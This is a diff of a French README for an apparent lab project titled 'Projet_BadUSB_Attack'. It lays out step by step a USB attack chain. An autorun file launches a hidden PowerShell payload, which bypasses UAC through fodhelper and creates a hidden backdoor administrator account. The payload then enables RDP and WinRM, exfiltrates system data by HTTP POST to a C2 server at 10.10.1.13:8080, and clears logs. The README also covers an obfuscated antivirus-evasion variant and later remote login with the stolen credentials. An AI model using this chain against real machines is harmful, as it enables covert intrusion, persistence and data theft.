@@ -17,9 +17,7 @@ Projet_BadUSB_Attack/
 │   │   ├── autorun.inf         # AutoRun – déclenche launcher.vbs à l'insertion
 │   │   ├── launcher.vbs        # Lanceur silencieux VBScript
 │   │   ├── payload.ps1         # Payload principal (version lisible)
-│   │   ├── payload_obfusque.ps1# Payload obfusqué (évasion AV)
-│   │   ├── prepare_usb.ps1     # Préparation clé USB (raccourci LNK + masquage)
-│   │   └── setup_target.ps1    # Préparation machine cible (réactivation AutoRun)
+│   │   └── payload_obfusque.ps1# Payload obfusqué (évasion AV)
 │   └── serveur_c2/
 │       ├── server.py           # Serveur C2 Flask (attaquant)
 │       └── requirements.txt
@@ -35,60 +33,49 @@ Projet_BadUSB_Attack/
 
 | Étape | Action | Délai |
 |-------|--------|-------|
-| 0 | `setup_target.ps1` exécuté **une fois** sur la machine cible (avant la démo) | Avant T+0 |
 | 1 | Insertion de la clé USB dans le port | T+0 s |
-| 2 | Windows lit `autorun.inf` → `launcher.vbs` s'exécute automatiquement (aucun clic) | T+0–1 s |
-| 3 | `payload.ps1` s'exécute en arrière-plan | T+1 s |
-| 4 | Anti-analyse + élévation silencieuse (UAC bypass) | T+1–3 s |
+| 2 | Windows lit `autorun.inf` → `launcher.vbs` s'exécute | T+0–1 s |
+| 3 | `payload.ps1` s'exécute dans le contexte de l'utilisateur courant | T+1 s |
+| 4 | Anti-analyse + élévation silencieuse (UAC bypass fodhelper) | T+1–3 s |
 | 5 | Création du compte administrateur caché | T+4 s |
 | 6 | Activation RDP + WinRM + règles pare-feu | T+5–8 s |
 | 7 | Collecte des informations système | T+9 s |
-| 8 | Exfiltration vers le serveur C2 | T+10–13 s |
+| 8 | Exfiltration vers le serveur C2 (`10.10.1.13:8080`) | T+10–13 s |
 | 9 | Nettoyage des journaux | T+13–15 s |
 | 10 | Retrait de la clé USB | ≤ T+15 s |
 
-### Mécanisme de déclenchement automatique
+### Déclenchement depuis un compte utilisateur standard
 
-#### Pré-condition : AutoRun activé sur la machine cible
+Le payload est conçu pour s'exécuter **depuis un compte utilisateur standard
+(non élevé)**. L'élévation de privilèges est obtenue automatiquement via le
+bypass UAC **fodhelper.exe** (MITRE ATT&CK T1548.002) :
 
-L'entrée **`open=`** de `autorun.inf` déclenche `launcher.vbs` automatiquement
-lors de l'insertion de la clé USB, **sans aucun clic de l'utilisateur** — à
-condition qu'AutoRun soit activé sur la machine cible.
-
-Par défaut sous Windows 10/11 (correctif KB971029), AutoRun est désactivé pour
-les lecteurs amovibles (`NoDriveTypeAutoRun = 0x91`). La clé de registre
-`NoDriveTypeAutoRun` est le seul verrou à lever.
-
-#### Étape A – Préparation de la machine cible (`setup_target.ps1`)
-
-Exécuter **une fois** sur la machine cible, avant la démonstration :
-
-```powershell
-powershell -ExecutionPolicy Bypass -File setup_target.ps1
-```
-
-Ce script :
-1. Positionne `NoDriveTypeAutoRun = 0x00` dans `HKLM` et `HKCU` → AutoRun actif pour tous les lecteurs.
-2. Supprime le handler AutoPlay par défaut (`StorageOnArrival`) qui pourrait intercepter l'événement avant `autorun.inf`.
-3. S'assure que le service `ShellHWDetection` (requis pour AutoRun) est démarré.
-4. Désactive la protection temps réel de Windows Defender pour la durée du TP.
-5. Redémarre l'Explorateur Windows pour appliquer les changements immédiatement (sans reboot).
-
-#### Étape B – Insertion de la clé USB
-
-Une fois la machine cible préparée, insérer la clé USB :
+1. `launcher.vbs` lance `payload.ps1` dans le contexte de l'utilisateur courant.
+2. Le payload détecte qu'il ne tourne pas en mode administrateur.
+3. Il inscrit la commande de re-lancement dans
+   `HKCU:\Software\Classes\ms-settings\shell\open\command`, puis déclenche
+   `fodhelper.exe` (processus auto-élevé de Windows 10/11).
+4. Windows relance le payload avec les droits Administrateur, sans afficher
+   de prompt UAC.
+5. La clé temporaire est supprimée immédiatement.
 
 ```
-[Clé USB insérée]
+[Compte utilisateur standard]
        │
        ▼
-[Windows lit autorun.inf]   ← open=launcher.vbs
+[launcher.vbs → payload.ps1 lancé]
+       │
+       ├─ Test-Admin → NON
        │
        ▼
-[launcher.vbs exécuté automatiquement]  ← aucune interaction
+[UAC bypass fodhelper]
        │
        ▼
-[payload.ps1 lancé via PowerShell masqué]
+[payload.ps1 relancé avec droits Admin]
+       │
+       ├─ Création compte backdoor (svc_XXXXXX)
+       ├─ Activation RDP + WinRM
+       └─ Exfiltration → 10.10.1.13:8080
 ```
 
 ### Fichiers à copier sur la clé USB
@@ -100,39 +87,27 @@ Racine de la clé USB/
 └── payload.ps1             ← charge utile
 ```
 
-### Configuration avant déploiement
+### Déploiement
 
-**Étape A – Préparer la machine cible (une fois, avant la démo)**
+**Étape 1 – Démarrer le serveur C2 sur la machine attaquante (10.10.1.13)**
 
-1. Sur la machine cible (Windows 10/11), ouvrir PowerShell en tant qu'Administrateur.
-2. Exécuter :
-   ```powershell
-   powershell -ExecutionPolicy Bypass -File setup_target.ps1
-   ```
-   Ce script réactive AutoRun (`NoDriveTypeAutoRun = 0x00`), démarre le service
-   `ShellHWDetection` et désactive temporairement Windows Defender.
+```bash
+cd partie1/serveur_c2
+pip install -r requirements.txt
+python server.py --host 0.0.0.0 --port 8080
+```
 
-**Étape B – Préparer et déployer la clé USB**
+Interface de suivi : `http://10.10.1.13:8080/status`
 
-1. Lancer le serveur C2 sur la machine attaquante :
-   ```bash
-   cd partie1/serveur_c2
-   pip install -r requirements.txt
-   python server.py --host 0.0.0.0 --port 8080
-   ```
+**Étape 2 – Préparer la clé USB**
 
-2. Noter l'adresse IP publique/locale de la machine attaquante.
+Copier `autorun.inf`, `launcher.vbs` et `payload.ps1` (ou `payload_obfusque.ps1`)
+à la racine de la clé USB.
 
-3. Remplacer `ATTACKER_IP` dans `payload.ps1` (et `payload_obfusque.ps1`) :
-   ```powershell
-   $c2Base = "http://192.168.X.X:8080"   # Remplacer ici
-   ```
+**Étape 3 – Insérer la clé USB dans la machine cible**
 
-4. Copier `autorun.inf`, `launcher.vbs` et `payload.ps1` à la racine de la
-   clé USB.
-
-5. **Insérer la clé USB dans la machine cible** : `launcher.vbs` s'exécute
-   automatiquement, sans aucune interaction de l'utilisateur.
+L'utilisateur cible n'a pas besoin de droits administrateur. Le payload
+s'élève automatiquement.
 
 ### Fonctionnalités du payload
 
@@ -172,7 +147,7 @@ Le bypass **fodhelper.exe** est utilisé :
 
 #### Exfiltration des données
 
-Données transmises en JSON via HTTP POST vers `$c2Base/collect` :
+Données transmises en JSON via HTTP POST vers `http://10.10.1.13:8080/collect` :
 
 ```json
 {
@@ -213,7 +188,7 @@ Techniques appliquées :
 
 ### Serveur C2 (`server.py`)
 
-Interface de visualisation : `http://ATTACKER_IP:8080/status`
+Interface de visualisation : `http://10.10.1.13:8080/status`
 
 | Endpoint | Méthode | Rôle |
 |----------|---------|------|
@@ -267,7 +242,7 @@ connecter à la machine cible via :
 ### RDP (Bureau à distance)
 
 ```
-mstsc /v:<IP_PUBLIQUE>:3389
+mstsc /v:<IP_CIBLE>:3389
 Utilisateur : svc_<suffix>
 Mot de passe : <reçu sur le serveur C2>
 ```
@@ -276,7 +251,7 @@ Mot de passe : <reçu sur le serveur C2>
 
 ```powershell
 $cred = Get-Credential  # svc_<suffix> / <mot de passe>
-Enter-PSSession -ComputerName <IP_PUBLIQUE> -Credential $cred
+Enter-PSSession -ComputerName <IP_CIBLE> -Credential $cred
 ```
 
 ---
